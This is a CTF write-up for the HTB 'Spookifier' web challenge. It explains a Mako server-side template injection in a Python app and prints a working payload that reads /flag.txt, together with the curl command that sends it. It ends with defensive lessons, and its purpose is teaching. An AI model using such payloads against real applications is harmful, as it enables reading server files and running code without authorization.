---
ctf: HTBLabs
title: Spookifier
category: web
difficulty: unknown
tags: [ssti, mako, python, source-code-review]
flag_format: HTB{...}
date: 2026-08-11
---

# Spookifier

## Challenge
There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application? IP: 154.57.164.78:30211

## Approach

The application accepts a `text` query parameter and passes it to `spookify()`:

```python
text = request.args.get('text')
converted = spookify(text)
return render_template('index.html', output=converted)
```

Inside `spookify()`, the supplied text is converted into four different fonts. The fourth font preserves letters, digits, and Mako syntax characters such as `$`, `{`, `}`, `(`, `)`, quotes, `/`, and `.`.

The converted values are then interpolated into a string which is compiled and rendered as a new Mako template:

```python
def generate_render(converted_fonts):
    result = '''
        <tr><td>{0}</td></tr>
        <tr><td>{1}</td></tr>
        <tr><td>{2}</td></tr>
        <tr><td>{3}</td></tr>
    '''.format(*converted_fonts)

    return Template(result).render()
```

This creates a server-side template injection vulnerability. A Mako expression placed in the input survives in the fourth converted value and is evaluated by `Template(result).render()`.

The Dockerfile shows that the flag is copied to `/flag.txt`, so it can be read directly with Python's `open()` builtin:

```mako
${open("/flag.txt").read()}
```

The payload can be sent with:

```bash
curl --get \
  --data-urlencode 'text=${open("/flag.txt").read()}' \
  http://154.57.164.78:30211/
```

The response contains the flag in the fourth table row.

## Tools

- `rg` and `sed` for source-code review
- `curl` for sending the URL-encoded SSTI payload

## Lessons

- Never compile user-controlled content as a server-side template.
- Transforming input is not sanitization when the transformation preserves template syntax.
- Render user data as a value in a trusted template and rely on contextual escaping instead of constructing a new template string.
- Deployment files such as a Dockerfile can reveal useful details, including the flag's filesystem location.

## Flag

```text
HTB{redacted}
```
